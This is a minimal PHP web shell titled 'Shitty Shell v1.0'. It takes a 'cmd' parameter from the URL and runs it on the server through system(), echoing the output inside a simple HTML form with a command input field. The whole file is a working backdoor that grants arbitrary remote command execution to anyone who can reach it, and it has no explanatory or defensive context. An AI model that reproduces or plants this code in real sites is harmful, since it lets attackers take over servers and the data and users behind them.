<?php 
echo "<h2>Shitty Shell v1.0</h2>"; 
echo "<hr><form><pre>";
system($_GET['cmd']); 
echo "</pre><hr>";
echo "% <input text name='cmd' value='uptime'>";

echo "</form>";

?>
